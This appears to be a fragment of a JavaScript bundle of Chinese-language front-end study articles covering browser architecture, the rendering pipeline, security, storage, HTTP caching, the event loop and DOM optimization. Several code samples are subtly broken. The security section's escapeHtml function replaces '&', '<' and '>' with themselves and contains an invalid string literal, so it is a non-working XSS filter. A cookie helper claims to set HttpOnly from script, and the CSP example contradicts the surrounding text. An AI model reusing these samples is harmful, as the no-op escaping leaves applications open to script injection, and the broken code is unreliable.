  integrations: [new BrowserTracing()],
  tracesSampleRate: 1.0,
  beforeSend(event) {
    // 自定义错误处理
    return event;
  }
});

**Google Analytics 配置：**

import { initializeApp } from 'firebase/app';
import { getAnalytics } from 'firebase/analytics';

const app = initializeApp({
  apiKey: 'YOUR_API_KEY',
  authDomain: 'YOUR_AUTH_DOMAIN',
  projectId: 'YOUR_PROJECT_ID',
  appId: 'YOUR_APP_ID',
  measurementId: 'YOUR_MEASUREMENT_ID'
});

const analytics = getAnalytics(app);

### 案例分析

**大型网站监控：**
- Google 的监控实践
- Facebook 的监控实践
- Amazon 的监控实践
- 阿里巴巴的监控实践

**实施效果：**
- 错误率降低
- 性能提升
- 用户体验改善
- 业务指标优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"browser-architecture",title:"浏览器架构与渲染流程",category:"browser",difficulty:"medium",tags:["浏览器原理","浏览器架构","渲染流程","进程模型"],content:`## 浏览器架构与渲染流程

现代浏览器采用多进程架构，了解其工作原理对于前端开发至关重要。

### 🏗️ 浏览器进程模型

**进程与线程：**
- **进程**：操作系统分配资源的基本单位，拥有独立的内存空间和系统资源，进程之间相互隔离，一个进程崩溃不会影响其他进程
- **线程**：进程内的执行单元，共享进程的内存和资源，线程切换开销小，但需要处理同步和互斥问题
- **多进程优势**：提高浏览器稳定性，单个标签页崩溃不影响其他页面；增强安全性，进程隔离防止恶意代码扩散；优化性能，充分利用多核CPU资源

**主要进程：**
- **浏览器进程**：负责浏览器整体控制，包括地址栏、书签栏、前进后退按钮等UI界面管理，以及网络请求管理、文件访问等核心功能
- **渲染进程**：负责页面渲染工作，将HTML、CSS和JavaScript转换为用户可见的网页，每个标签页通常对应一个独立的渲染进程
- **插件进程**：负责运行浏览器插件，如Flash、PDF查看器等，插件进程与渲染进程隔离，防止插件崩溃影响页面
- **GPU 进程**：负责处理图形渲染任务，将页面内容绘制到屏幕上，支持硬件加速，提高渲染性能和流畅度

**渲染进程线程：**
- **GUI 线程**：负责渲染页面内容，解析HTML、CSS，构建DOM树和渲染树，执行布局和绘制操作，与JS引擎线程互斥
- **JS 引擎线程**：负责解析和执行JavaScript代码，处理用户脚本逻辑，执行事件处理函数，GUI线程和JS引擎线程不能同时工作
- **事件触发线程**：负责管理事件队列，当事件被触发时将回调函数添加到任务队列，等待JS引擎线程执行，实现异步事件处理
- **定时器线程**：负责管理setTimeout和setInterval定时器，当定时器到期时将回调函数添加到任务队列，实现延迟执行功能
- **网络请求线程**：负责处理网络请求，当请求完成时将回调函数添加到任务队列，实现异步网络请求，不阻塞主线程

### 💻 代码示例：查看浏览器进程

\`\`\`javascript
// 在 Chrome DevTools 中查看进程信息
// 1. 打开 Chrome DevTools
// 2. 进入 Performance 面板
// 3. 录制页面操作
// 4. 查看 Bottom-Up 视图中的进程信息

// 检查当前页面的进程ID
console.log('当前页面进程信息:', performance.memory);
console.log('时间戳:', performance.now());

// 监控页面性能
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('性能条目:', entry.name, entry.duration);
  }
});
observer.observe({ entryTypes: ['measure', 'navigation'] });
\`\`\`

### 🔄 渲染流程

**HTML 解析：**
- **解析 HTML 生成 DOM 树**：浏览器将HTML文档解析为DOM（文档对象模型）树，DOM树是HTML文档的结构化表示，包含所有HTML元素及其层级关系
- **词法分析**：将 HTML 分解为标记：浏览器将HTML字符串分解为一个个标记（Token），如开始标签、结束标签、属性名、属性值等，为后续语法分析做准备
- **语法分析**：构建 DOM 树：根据标记序列构建DOM树，处理元素之间的父子关系、兄弟关系，构建完整的文档结构树
- **DOM 树**：表示页面结构：DOM树是HTML文档在内存中的表示，JavaScript可以通过DOM API操作DOM树，从而动态修改页面内容和结构

**CSS 解析：**
- **解析 CSS 生成 CSSOM 树**：浏览器将CSS样式表解析为CSSOM（CSS对象模型）树，CSSOM树包含所有CSS规则及其层级关系，用于计算元素最终样式
- **处理 CSS 选择器**：浏览器解析CSS选择器，确定样式规则应用于哪些元素，处理选择器的优先级和层叠规则，计算元素的计算样式
- **计算样式**：浏览器根据CSSOM树和DOM树，计算每个元素的最终样式值，包括继承样式、默认样式和显式设置的样式
- **CSSOM 树**：表示样式信息：CSSOM树是CSS样式表在内存中的表示，JavaScript可以通过CSSOM API操作样式规则，动态修改页面样式

**渲染树构建：**
- **结合 DOM 树和 CSSOM 树**：浏览器将DOM树和CSSOM树合并，生成渲染树（Render Tree），渲染树只包含需要显示的节点和这些节点的样式信息
- **生成渲染树**：渲染树是DOM树和CSSOM树的结合产物，每个节点都包含内容和计算后的样式，是后续布局和绘制的基础
- **只包含可见元素**：渲染树不包含display:none的元素、head元素、script元素等不可见元素，只包含实际需要渲染到屏幕上的元素
- **计算每个元素的样式**：浏览器根据CSSOM树计算渲染树中每个节点的最终样式值，包括继承样式、默认样式和显式设置的样式

**布局 (Layout)：**
- **计算元素的位置和大小**：浏览器根据渲染树计算每个元素在页面中的精确位置和尺寸，包括元素的坐标、宽高、边距、边框等几何信息
- **确定元素在页面中的布局**：浏览器处理元素的定位方式（static、relative、absolute、fixed、sticky），确定元素在页面中的最终位置
- **生成布局树**：布局树包含所有可见元素的几何信息，是后续绘制阶段的基础，布局树的构建过程也称为回流（Reflow）
- **也称为回流 (Reflow)**：当页面布局发生变化时，浏览器需要重新计算元素的位置和大小，这个过程称为回流，回流是性能消耗较大的操作

**绘制 (Paint)：**
- **将渲染树转换为像素**：浏览器根据布局树中的几何信息，将每个元素绘制到屏幕上，将矢量图形转换为像素点阵，生成最终的视觉效果
- **绘制元素的视觉效果**：浏览器绘制元素的背景色、边框、文字、阴影等视觉属性，处理渐变、图片、文字渲染等复杂视觉效果
- **生成图层**：浏览器将页面内容分层，每个图层独立绘制，便于后续合成操作，提高渲染性能，支持硬件加速
- **也称为重绘 (Repaint)**：当元素的视觉样式发生变化但不影响布局时，浏览器需要重新绘制元素，这个过程称为重绘，重绘的性能消耗小于回流

**合成 (Compositing)：**
- **将图层合成为最终图像**：浏览器将多个图层按照正确的顺序和位置合成到一起，生成最终显示在屏幕上的完整图像，这个过程在GPU中进行
- **利用 GPU 加速**：合成操作在GPU中进行，利用显卡的并行计算能力，大幅提高渲染性能，减少CPU负担，实现流畅的动画效果
- **提高渲染性能**：通过图层合成，浏览器可以只更新变化的图层，而不需要重新绘制整个页面，显著提高渲染性能和响应速度
- **减少重绘和回流**：合成操作独立于主线程，不会触发回流和重绘，适合处理动画、3D变换等高频更新操作，提供更流畅的用户体验

### 💻 代码示例：监控渲染性能

\`\`\`javascript
// 监控关键渲染路径
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.entryType === 'navigation') {
      const navEntry = entry as PerformanceNavigationTiming;
      console.log('DOM 解析时间:', navEntry.domContentLoadedEventEnd - navEntry.domContentLoadedEventStart);
      console.log('页面加载时间:', navEntry.loadEventEnd - navEntry.loadEventStart);
      console.log('首次绘制:', navEntry.responseStart - navEntry.requestStart);
    }
  }
});

observer.observe({ entryTypes: ['navigation'] });

// 强制同步布局示例
function badExample() {
  const element = document.getElementById('myElement');
  // 触发回流
  console.log(element.offsetWidth);
  // 修改样式
  element.style.width = '100px';
  // 再次触发回流
  console.log(element.offsetHeight);
}

// 优化后的示例
function goodExample() {
  const element = document.getElementById('myElement');
  // 缓存布局信息
  const width = element.offsetWidth;
  const height = element.offsetHeight;
  
  // 批量修改样式
  element.style.cssText = 'width: 100px; height: 50px; background: blue;';
  
  console.log('原始尺寸:', width, height);
}
\`\`\`

### ⚡ 关键渲染路径

**关键渲染路径：**
- **HTML 解析 → CSS 解析 → 渲染树构建 → 布局 → 绘制**：这是浏览器将HTML、CSS和JavaScript转换为屏幕上像素的完整过程，每个步骤都需要时间，优化这个路径可以提高首屏加载速度
- **优化关键渲染路径可以提高首屏加载速度**：通过减少关键资源数量、优化资源大小、延迟加载非关键资源等方式，可以显著提高页面的首次渲染速度，改善用户体验
- **关键资源**：影响首屏渲染的资源：关键资源包括阻塞渲染的CSS、阻塞解析的JavaScript、首屏可见的图片等，这些资源的加载和解析直接影响首屏渲染时间

**优化策略：**
- **减少关键资源数量**：通过内联关键CSS、延迟加载非关键JavaScript、合并CSS和JavaScript文件等方式，减少阻塞渲染的资源数量，加快首屏渲染速度
- **优化关键资源大小**：通过压缩CSS和JavaScript文件、优化图片大小、移除未使用的代码等方式，减少关键资源的体积，缩短下载和解析时间
- **缩短关键资源加载时间**：使用CDN加速资源加载、启用HTTP/2多路复用、使用preload预加载关键资源、优化服务器响应时间等方式，加快资源加载速度
- **优化渲染阻塞**：将非关键CSS设置为媒体查询、使用async或defer属性加载JavaScript、将JavaScript放在body底部等方式，减少渲染阻塞

### 🚀 浏览器渲染优化

**减少回流：**
- **使用 CSS transform 代替 top/left**：transform属性不会触发回流，只触发合成，性能更好，适合处理动画和位移效果，推荐使用translate3d触发GPU加速
- **批量修改样式**：通过修改元素的class或使用cssText一次性修改多个样式属性，避免多次触发回流，减少性能消耗
- **使用 documentFragment**：在内存中构建DOM片段，一次性插入到文档中，避免多次操作DOM导致的多次回流，提高性能
- **避免频繁访问布局属性**：读取offsetTop、offsetLeft、offsetWidth、offsetHeight等属性会强制浏览器同步计算布局，应缓存这些值避免重复读取

### 💻 代码示例：关键渲染路径优化

\`\`\`html
<!-- 优化前：阻塞渲染的资源 -->
<link rel="stylesheet" href="styles.css">
<script src="main.js"></script>

<!-- 优化后：内联关键CSS，异步加载JS -->
<style>
  /* 关键CSS内联 */
  body { margin: 0; font-family: Arial; }
  .header { background: #333; color: white; padding: 1rem; }
</style>

<!-- 预加载关键资源 -->
<link rel="preload" href="fonts/main.woff2" as="font" crossorigin>
<link rel="preload" href="images/hero.webp" as="image">

<!-- 非关键CSS延迟加载 -->
<link rel="preload" href="styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="styles.css"></noscript>

<!-- 异步加载JavaScript -->
<script src="main.js" async></script>
\`\`\`

\`\`\`javascript
// 批量DOM操作优化
function optimizedDOMUpdate() {
  // 创建文档片段
  const fragment = document.createDocumentFragment();
  
  // 在内存中构建DOM
  for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.className = 'item';
    div.textContent = \`Item \${i}\`;
    fragment.appendChild(div);
  }
  
  // 一次性插入到文档
  document.getElementById('container').appendChild(fragment);
}

// 使用 requestAnimationFrame 优化动画
function smoothAnimation(element) {
  let start = null;
  
  function animate(timestamp) {
    if (!start) start = timestamp;
    const progress = timestamp - start;
    
    // 使用 transform 而不是 top/left
    element.style.transform = \`translateX(\${Math.min(progress / 10, 200)}px)\`;
    
    if (progress < 2000) {
      requestAnimationFrame(animate);
    }
  }
  
  requestAnimationFrame(animate);
}
\`\`\`

**减少重绘：**
- **避免使用 CSS expressions**：CSS表达式会在页面滚动、缩放等操作时频繁重新计算，导致大量重绘，严重影响性能，应使用JavaScript或纯CSS替代
- **合理使用 visibility 代替 display**：visibility:hidden只触发重绘不触发回流，而display:none会触发回流，对于需要频繁切换显示隐藏的元素，使用visibility性能更好
- **减少 CSS 渐变和阴影**：复杂的CSS渐变、阴影效果会增加绘制时间，应合理使用，避免过度使用，在性能敏感的场景使用简单样式替代
- **优化选择器性能**：避免使用通配符选择器、嵌套层级过深的选择器，选择器越简单性能越好，浏览器从右向左匹配选择器，应减少匹配次数

**利用合成层：**
- **使用 transform: translateZ(0) 创建合成层**：通过CSS transform属性创建独立的合成层，将元素提升到独立的图层，避免影响其他元素的渲染，提高动画性能
- **使用 will-change 提示浏览器**：will-change属性可以提前告知浏览器元素将要发生变化，浏览器会为该元素创建独立的图层并优化渲染，但不要过度使用
- **适合动画元素**：对于需要频繁动画的元素，如轮播图、滚动动画、3D变换等，创建合成层可以避免回流和重绘，实现流畅的60fps动画效果
- **减少重绘范围**：合成层的元素变化只会影响该图层，不会触发其他图层的重绘，通过合理使用合成层可以大幅减少重绘范围，提高渲染性能

### 🔒 浏览器安全

**同源策略：**
- **限制不同源之间的交互**：同源策略是浏览器的核心安全机制，它限制了一个源的文档或脚本如何与另一个源的资源进行交互，防止恶意网站读取其他网站的数据
- **源：协议、域名、端口**：源由协议（http/https）、域名（example.com）和端口（80/443）三部分组成，只有三者完全相同才是同源，任何一个不同都是跨域
- **保护用户数据安全**：同源策略防止恶意网站通过脚本访问其他网站的敏感数据，如Cookie、localStorage、DOM等，是Web安全的基础

**沙箱机制：**
- **隔离不同网站的进程**：浏览器使用沙箱技术将不同网站的渲染进程相互隔离，每个标签页或iframe运行在独立的沙箱环境中，限制其访问系统资源的能力
- **防止恶意代码影响其他网站**：沙箱机制限制了渲染进程的权限，如无法访问文件系统、无法访问其他进程的内存、无法执行系统命令等，防止恶意代码扩散
- **提高浏览器稳定性**：即使某个网站的代码存在漏洞或恶意行为，沙箱机制也能将其限制在当前进程中，不会影响其他标签页或浏览器本身的稳定性

### 💻 代码示例：安全最佳实践

\`\`\`javascript
// CSP 内容安全策略示例
// 在服务器响应头中设置
// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';

// 防止XSS攻击的安全函数
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&")
    .replace(/</g, "<")
    .replace(/>/g, ">")
    .replace(/"/g, """)
    .replace(/'/g, "&#039;");
}

// 安全的DOM操作
function safeUpdateContent(elementId, userContent) {
  const element = document.getElementById(elementId);
  // 使用textContent而不是innerHTML防止XSS
  element.textContent = userContent;
}

// 跨域安全通信
// 在iframe中安全通信
const iframe = document.getElementById('myFrame');
iframe.contentWindow.postMessage('Hello from parent', 'https://trusted-domain.com');

// 监听消息并验证来源
window.addEventListener('message', (event) => {
  // 验证消息来源
  if (event.origin !== 'https://trusted-domain.com') {
    return;
  }
  
  console.log('收到安全消息:', event.data);
});
\`\`\`

**内容安全策略 (CSP)：**
- **限制资源加载来源**：CSP通过HTTP头或meta标签指定允许加载的资源来源，如脚本、样式、图片、字体等，防止加载来自恶意域名的资源
- **防止 XSS 攻击**：CSP禁止内联脚本和eval等危险函数，即使攻击者注入了恶意脚本，也无法执行，有效防御XSS攻击
- **提高网站安全性**：CSP是深度防御策略的重要组成部分，配合其他安全措施如HTTPS、HttpOnly Cookie等，可以显著提高网站的整体安全性

### 💾 浏览器存储

**Cookie：**
- **小型文本文件**：Cookie是浏览器存储在用户设备上的小型文本文件，由服务器通过Set-Cookie响应头设置，浏览器会在后续请求中自动携带Cookie
- **存储用户信息**：Cookie常用于存储用户会话信息、登录状态、用户偏好等，实现用户身份识别和状态保持功能
- **随请求发送**：浏览器会在每次HTTP请求中自动携带匹配的Cookie，这会增加请求大小，应合理设置Cookie的使用范围
- **大小限制约 4KB**：单个Cookie的大小限制约为4KB，每个域名下的Cookie数量也有限制（通常为20-50个），不适合存储大量数据

**localStorage：**
- **持久存储**：localStorage提供持久化的本地存储，数据存储在用户设备上，除非手动清除或通过代码删除，否则数据会一直保留，不会随浏览器关闭而丢失
- **容量约 5MB**：localStorage的存储容量通常为5MB左右，比Cookie大得多，适合存储较多数据，但仍不适合存储大量数据或敏感信息
- **同源策略**：localStorage遵循同源策略，只有相同协议、域名和端口的页面才能访问相同的localStorage数据，不同源之间数据隔离
- **适合存储用户偏好**：localStorage适合存储用户的偏好设置、主题配置、语言选择等非敏感数据，实现个性化体验

**sessionStorage：**
- **会话存储**：sessionStorage提供会话级别的本地存储，数据只在当前浏览器窗口或标签页中有效，当窗口或标签页关闭时，数据会被自动清除
- **容量约 5MB**：sessionStorage的存储容量通常为5MB左右，与localStorage相同，适合存储会话期间的临时数据，不会占用过多存储空间
- **会话结束后清除**：当用户关闭浏览器窗口或标签页时，sessionStorage中的数据会被自动清除，适合存储不需要持久化的临时数据
- **适合临时数据**：sessionStorage适合存储表单数据、临时状态、页面间传递的参数等会话期间的临时数据，实现页面间的数据共享

**IndexedDB：**
- **大型存储**：IndexedDB是浏览器提供的NoSQL数据库，支持存储大量结构化数据，包括对象、数组等复杂类型，存储容量远大于localStorage和sessionStorage
- **容量较大**：IndexedDB的存储容量通常为磁盘可用空间的一定比例（如50%），可以存储数百MB甚至GB级别的数据，适合离线应用和大型数据缓存
- **异步 API**：IndexedDB使用异步API进行数据操作，不会阻塞主线程，支持事务、索引、游标等高级数据库功能，适合处理复杂数据操作
- **适合复杂数据**：IndexedDB适合存储离线数据、大量用户数据、复杂的数据结构，如邮件客户端、笔记应用、离线文档编辑器等需要大量本地存储的应用

### 💻 代码示例：浏览器存储操作

\`\`\`javascript
// Cookie 操作
function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
  document.cookie = \`\${name}=\${value};expires=\${expires.toUTCString()};path=/;Secure;HttpOnly\`;
}

function getCookie(name) {
  const nameEQ = name + "=";
  const ca = document.cookie.split(';');
  for(let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

// localStorage 操作
function saveToLocalStorage(key, data) {
  try {
    localStorage.setItem(key, JSON.stringify(data));
  } catch (e) {
    console.error('localStorage 存储失败:', e);
  }
}

function getFromLocalStorage(key) {
  try {
    const data = localStorage.getItem(key);
    return data ? JSON.parse(data) : null;
  } catch (e) {
    console.error('localStorage 读取失败:', e);
    return null;
  }
}

// IndexedDB 操作示例
class IndexedDBHelper {
  constructor(dbName, version) {
    this.dbName = dbName;
    this.version = version;
    this.db = null;
  }

  async open() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, this.version);
      
      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };
      
      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains('users')) {
          db.createObjectStore('users', { keyPath: 'id' });
        }
      };
    });
  }

  async add(storeName, data) {
    const transaction = this.db.transaction([storeName], 'readwrite');
    const store = transaction.objectStore(storeName);
    return store.add(data);
  }

  async get(storeName, id) {
    const transaction = this.db.transaction([storeName], 'readonly');
    const store = transaction.objectStore(storeName);
    return store.get(id);
  }
}

// 使用示例
const dbHelper = new IndexedDBHelper('myDatabase', 1);
await dbHelper.open();
await dbHelper.add('users', { id: 1, name: '张三', email: 'zhangsan@example.com' });
\`\`\`

### 🌐 网络请求

**HTTP 协议：**
- **HTTP/1.1：持久连接**：HTTP/1.1默认启用持久连接（Keep-Alive），允许多个请求复用同一个TCP连接，减少连接建立和关闭的开销，提高性能
- **HTTP/2：多路复用**：HTTP/2支持多路复用，在一个TCP连接上可以同时发送多个请求和响应，解决了HTTP/1.1的队头阻塞问题，大幅提高性能
- **HTTP/3：基于 QUIC**：HTTP/3基于QUIC协议，使用UDP代替TCP，实现更快的连接建立、更好的拥塞控制和更强的可靠性，是HTTP协议的未来
- **HTTPS：加密传输**：HTTPS通过TLS/SSL协议加密HTTP通信，保护数据传输安全，防止中间人攻击和数据窃听，是现代Web的标准配置

**缓存策略：**
- **强缓存：Cache-Control, Expires**：强缓存通过Cache-Control和Expires响应头设置，浏览器直接使用本地缓存而不发送请求，减少网络传输，提高加载速度
- **协商缓存：ETag, Last-Modified**：协商缓存通过ETag和Last-Modified响应头验证资源是否更新，浏览器发送请求验证，服务器返回304表示使用缓存，减少传输数据量
- **缓存位置：Memory Cache, Disk Cache**：浏览器缓存分为内存缓存（Memory Cache）和磁盘缓存（Disk Cache），内存缓存速度快但容量小，磁盘缓存容量大但速度较慢

**资源加载：**
- **预加载：preload**：preload用于预加载关键资源，如字体、关键CSS、关键JavaScript等，浏览器会提前加载这些资源，减少首屏渲染时间，提高用户体验
- **预连接：preconnect**：preconnect用于提前建立与目标服务器的连接，包括DNS解析、TCP连接、TLS握手，减少后续请求的延迟，适合连接到CDN或API服务器
- 预解析：dns-prefetch：dns-prefetch用于提前解析域名，减少DNS解析时间，适合连接到第三方域名，如CDN、API服务器、广告平台等
- 预获取：prefetch：prefetch用于预获取未来可能需要的资源，如下一页的资源，浏览器会在空闲时加载这些资源，提高后续页面的加载速度

### 浏览器事件循环

**事件循环：**
- **处理异步操作**：事件循环是JavaScript处理异步操作的核心机制，通过任务队列管理异步任务的执行顺序，确保异步操作按正确顺序执行
- **任务队列：宏任务和微任务**：任务队列分为宏任务队列和微任务队列，宏任务包括setTimeout、setInterval、I/O等，微任务包括Promise.then、MutationObserver等
- **执行顺序：微任务 → 宏任务**：事件循环的执行顺序是先执行同步代码，然后执行微任务队列中的所有任务，最后执行宏任务队列中的一个任务，循环往复
- **事件处理机制**：事件循环机制确保用户交互事件、网络请求、定时器等异步操作能够正确执行，同时保持页面的响应性

**宏任务：**
- **setTimeout**：setTimeout用于延迟执行代码，将回调函数添加到宏任务队列，在指定的延迟时间后执行，是最常用的定时器API
- **setInterval**：setInterval用于重复执行代码，将回调函数添加到宏任务队列，按照指定的时间间隔重复执行，适合周期性任务
- **I/O 操作**：文件读写、数据库操作等I/O操作是异步的，当操作完成时将回调函数添加到宏任务队列，不阻塞主线程
- **网络请求**：fetch、XMLHttpRequest等网络请求是异步的，当请求完成时将回调函数添加到宏任务队列，实现异步数据获取

**微任务：**
- **Promise.then()**：Promise.then()的回调函数会被添加到微任务队列，在当前宏任务执行完毕后立即执行，优先级高于宏任务
- **async/await**：async/await是Promise的语法糖，await后面的代码会被添加到微任务队列，实现同步风格的异步编程
- **MutationObserver**：MutationObserver用于监听DOM变化，当DOM发生变化时将回调函数添加到微任务队列，实现响应式DOM更新
- **process.nextTick**：process.nextTick是Node.js特有的微任务，优先级高于Promise.then()，在当前操作完成后立即执行

### 💻 代码示例：事件循环演示

\`\`\`javascript
// 事件循环执行顺序演示
console.log('1. 同步代码');

setTimeout(() => {
  console.log('4. 宏任务 - setTimeout');
}, 0);

Promise.resolve().then(() => {
  console.log('3. 微任务 - Promise');
});

console.log('2. 同步代码结束');

// 输出顺序：
// 1. 同步代码
// 2. 同步代码结束
// 3. 微任务 - Promise
// 4. 宏任务 - setTimeout

// 复杂事件循环示例
console.log('开始');

setTimeout(() => console.log('setTimeout 1'), 0);

Promise.resolve().then(() => {
  console.log('Promise 1');
  return Promise.resolve();
}).then(() => {
  console.log('Promise 2');
});

setTimeout(() => console.log('setTimeout 2'), 0);

console.log('结束');

// 输出顺序：
// 开始
// 结束
// Promise 1
// Promise 2
// setTimeout 1
// setTimeout 2
\`\`\`

### 🎯 最佳实践

**性能优化：**
- **减少 DOM 操作**：DOM操作是昂贵的，应尽量减少DOM操作次数，使用DocumentFragment批量操作、虚拟DOM等技术优化DOM操作性能
- **优化 CSS 选择器**：避免使用通配符选择器、嵌套层级过深的选择器，选择器越简单性能越好，浏览器从右向左匹配选择器
- **使用 requestAnimationFrame 处理动画**：requestAnimationFrame在浏览器重绘之前调用回调函数，确保动画流畅，避免使用setTimeout处理动画
- **合理使用 Web Workers**：将耗时计算任务放到Web Workers中执行，避免阻塞主线程，保持页面响应性

**安全实践：**
- **实施 CSP**：配置内容安全策略（CSP），限制资源加载来源，禁止内联脚本和eval，防止XSS攻击，提高网站安全性
- **避免 XSS 漏洞**：对用户输入进行转义和过滤，避免直接将用户输入插入到HTML中，使用textContent代替innerHTML，防止XSS攻击
- **防止 CSRF 攻击**：使用CSRF Token验证、SameSite Cookie属性、检查Referer头等方式，防止跨站请求伪造攻击
- **安全存储用户数据**：避免在前端存储敏感数据，如密码、Token等，必须存储时应加密处理，使用HttpOnly Cookie存储会话信息

**开发工具：**
- **Chrome DevTools**：Chrome浏览器内置的开发者工具，是前端开发最常用的调试和性能分析工具，提供Elements面板（检查和编辑DOM元素和CSS样式）、Console面板（查看日志和执行JavaScript）、Network面板（监控网络请求）、Performance面板（分析页面性能）、Memory面板（分析内存使用和检测内存泄漏）、Application面板（检查Storage、Cookie、Service Worker等应用数据）等，是前端开发必备的工具
- **Firefox Developer Tools**：Firefox浏览器内置的开发者工具，提供与Chrome DevTools类似的功能，包括Inspector、Console、Network、Performance、Memory等面板，还有一些特色功能如CSS变量检查器、响应式设计模式、可访问性检查器等，Firefox的开发者工具在CSS调试方面有一些独特的优势
- **Edge DevTools**：Microsoft Edge浏览器内置的开发者工具，基于Chromium内核，功能与Chrome DevTools非常相似，由于Edge是Windows系统的默认浏览器，在Windows平台上有一些原生集成优势，还提供一些独特功能如3D视图工具（查看页面的DOM层级）、CSS镜像编辑（实时预览CSS更改）等
- **Safari Developer Tools**：Safari浏览器内置的开发者工具，是开发和调试Safari及iOS Web应用的重要工具，提供Elements、Console、Network、Timeline等面板，Safari开发者工具在调试iOS设备上的网页时非常有用，可以通过Web Inspector连接iPhone或iPad进行真机调试，对于需要兼容Safari的项目是必备工具

### 📚 学习资源

**浏览器内部原理：**
- **How Browsers Work**：详细介绍浏览器工作原理的经典文章，涵盖HTML解析、CSS解析、渲染树构建、布局、绘制等完整流程，是学习浏览器原理的必读材料
- **Inside look at modern web browser**：Google Chrome团队发布的系列文章，深入介绍Chrome浏览器的多进程架构、站点隔离、渲染流程等内部原理
- **MDN Web Docs**：Mozilla维护的Web技术文档，提供HTML、CSS、JavaScript、DOM、Web API等技术的详细文档和教程，是前端开发的权威参考
- **Google Web Fundamentals**：Google提供的Web开发最佳实践指南，涵盖性能优化、安全、用户体验等主题，帮助开发者构建高质量的Web应用

**性能优化指南：**
- **Web Vitals**：Google推出的核心Web指标，包括LCP（最大内容绘制）、FID（首次输入延迟）、CLS（累积布局偏移），用于衡量和优化用户体验
- **Lighthouse**：Google开源的自动化工具，用于审计Web应用的性能、可访问性、最佳实践、SEO等，提供优化建议和评分报告
- Performance API：浏览器提供的性能监控API，包括Performance Timeline、Navigation Timing、Resource Timing等，用于测量和分析页面性能
- Core Web Vitals：Google定义的核心Web指标，包括LCP、FID、CLS，是影响用户体验的关键指标，也是Google搜索排名的重要因素`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"dom-optimization",title:"DOM 操作与优化",category:"browser",difficulty:"medium",tags:["浏览器原理","DOM","DOM 操作","性能优化"],content:`## DOM 操作与优化

DOM (Document Object Model) 是浏览器对 HTML 文档的结构化表示，DOM 操作是前端开发中最常见的操作之一，也是性能瓶颈的主要来源。

### 🌳 DOM 树结构

**DOM 节点类型：**
- **Element**：元素节点，表示HTML或XML文档中的元素，如div、span、p等，是DOM树中最常见的节点类型，可以通过document.createElement创建
- **Text**：文本节点，表示元素或属性中的文本内容，是DOM树的叶子节点，可以通过document.createTextNode创建
- **Comment**：注释节点，表示HTML或XML文档中的注释，不会显示在页面上，但可以通过DOM API访问和操作
- **Document**：文档节点，表示整个HTML或XML文档，是DOM树的根节点，可以通过document对象访问，提供创建其他节点的方法
- **DocumentFragment**：文档片段节点，轻量级的文档对象，用于在内存中存储节点，可以一次性插入到文档中，减少DOM操作次数

**DOM 树遍历：**
- **遍历方法**：childNodes, children, firstChild, lastChild, nextSibling, previousSibling：这些方法用于遍历DOM树，childNodes返回所有子节点，children只返回元素节点，其他方法用于获取相邻节点
- **遍历性能：避免深度遍历**：深度遍历大型DOM树会影响性能，应尽量减少遍历深度和次数，使用更具体的选择器或缓存节点引用优化性能
- **遍历优化：缓存节点引用**：在循环中频繁访问DOM节点时，应将节点引用缓存到变量中，避免重复查询DOM树，提高性能

**DOM 操作 API：**
- **创建节点**：createElement, createTextNode, createDocumentFragment：createElement创建元素节点，createTextNode创建文本节点，createDocumentFragment创建文档片段，用于批量操作DOM
- **添加节点**：appendChild, insertBefore：appendChild将节点添加到父节点的子节点列表末尾，insertBefore将节点插入到指定节点之前，是添加节点的两种主要方法
- **删除节点**：removeChild：removeChild从DOM树中删除指定节点，返回被删除的节点，删除前应确保节点存在，避免报错
- **修改节点**：innerHTML, textContent：innerHTML设置或获取元素的HTML内容，textContent设置或获取元素的文本内容，textContent性能更好且更安全

### ⚡ DOM 操作性能

**性能瓶颈：**
- **DOM 操作是昂贵的**：DOM操作涉及浏览器的重排和重绘，每次操作都需要浏览器重新计算布局和绘制页面，是前端性能的主要瓶颈
- **每次操作都可能触发重排和重绘**：修改元素的位置、大小、样式等都会触发浏览器的重排和重绘，频繁操作会导致性能下降
- **频繁操作会导致性能下降**：在循环中频繁操作DOM会导致大量重排和重绘，应批量处理DOM操作，减少操作次数
- **影响用户体验**：DOM操作性能问题会导致页面卡顿、响应缓慢，影响用户体验，应优化DOM操作提高页面性能

**重排与重绘：**
- **重排 (Reflow)**：计算元素位置和大小：当元素的几何属性（位置、大小）发生变化时，浏览器需要重新计算元素的位置和大小，这个过程称为重排，是性能消耗较大的操作
- **重绘 (Repaint)**：绘制元素视觉效果：当元素的视觉属性（颜色、背景、边框）发生变化但不影响布局时，浏览器需要重新绘制元素的视觉效果，这个过程称为重绘
- **重排会导致重绘**：重排必然导致重绘，因为元素的位置和大小变化后需要重新绘制，但重绘不一定导致重排
- **重绘不一定导致重排**：只改变元素的颜色、背景等视觉属性不会影响布局，只触发重绘不触发重排，性能消耗小于重排

**操作成本：**
- **读取布局属性：触发重排**：读取offsetTop、offsetLeft、offsetWidth、offsetHeight、scrollTop、scrollLeft、clientTop、clientLeft、clientWidth、clientHeight等属性会强制浏览器同步计算布局，触发重排
- **修改样式：可能触发重排或重绘**：修改元素的样式属性，如width、height、margin、padding等会触发重排，修改color、background等只会触发重绘
- **添加/删除元素：触发重排**：添加或删除DOM元素会改变DOM树结构，导致浏览器重新计算布局，触发重排
- **改变元素大小/位置：触发重排**：改变元素的width、height、margin、padding、position等属性会影响布局，触发重排

### 🚀 DOM 操作优化策略

**批量操作：**
- **使用 DocumentFragment**：DocumentFragment是轻量级的文档对象，可以在内存中构建DOM片段，然后一次性插入到文档中，减少DOM操作次数，提高性能
